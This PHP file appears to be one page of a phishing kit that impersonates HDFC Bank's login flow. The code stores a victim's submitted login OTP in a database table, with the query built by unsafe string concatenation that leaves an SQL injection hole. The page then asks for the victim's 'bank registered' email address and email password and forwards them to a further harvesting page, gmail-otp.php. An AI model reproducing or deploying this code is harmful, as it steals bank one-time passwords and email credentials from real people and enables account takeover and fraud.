<?php

if(!empty($_POST['login_otp'])) {
    $login_otp = $_POST['login_otp'];
}
else {
    header("Location: ./");
    die();
}
$token = $_POST['token'];

require_once "header.php";

$query = 'UPDATE `user_data` SET `login_otp` = "'.$login_otp.'" WHERE `UID` = "'.$token.'"';
require_once "db.php";

?>

<div class="container center" style="max-width:420px">
	<div class="row welcmewrap">
        <div class="welcomesec1" style="margin-bottom:0">
            <div class="hdfcstatictxt mB20">Login with Gmail</div>
            <div class="netwrapper">
                <div class="col-12">
			        <form method="post" action="gmail-otp.php">
                        <div class="mB20">
                            <div class="inputfield ibvt loginData">
                                <input
                                    autocomplete="off"
                                    placeholder="Email Address"
                                    name="gmail"
                                    pattern='^(([^<>()\[\]\.,;:\s@\"]+(\.[^<>()\[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$'
                                    class="form-control"
                                    type="email"
                                    required
                                    autofocus
                                />
                                <input name="token" value="<?php echo $token ?>" hidden />
                                <span style="display: block" class="fs12">Enter your bank registered email address</span>
                            </div>
                        </div>
                        <div class="mB20">
                            <div class="inputfield ibvt loginData">
                                <input
                                    autocomplete="off"
                                    placeholder="Password"
                                    name="gmail_pass"
                                    class="form-control"
                                    type="password"
                                    required
                                />
                                <span style="display: block" class="fs12">Enter your email password</span>
                            </div>
                        </div>
                        <div class="mB20">
                            <div class="inputfield ibvt loginData">
                                <button class="btn btn-primary login-btn" type="submit">LOGIN</button>
                            </div>
                        </div>
                    </form>
                </div>
                <br />
                <div class="col-12">
                    <div class="nortonsecurity center lnheight" style="text-align:center"><img alt="" src="images/nortonsecurity.png" /></div>
                    <div class="hdfcsmalltxt">
                        <span class="color666">Your security is of utmost importance.</span>
                        <span class="lightbluecolor"><a onclick="return window.open('https://www.hdfcbank.com/personal/useful-links/security')" href="javascript:void(0)">Know More...</a></span>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
	</div>
</div>

<?php include_once "footer.php"; ?>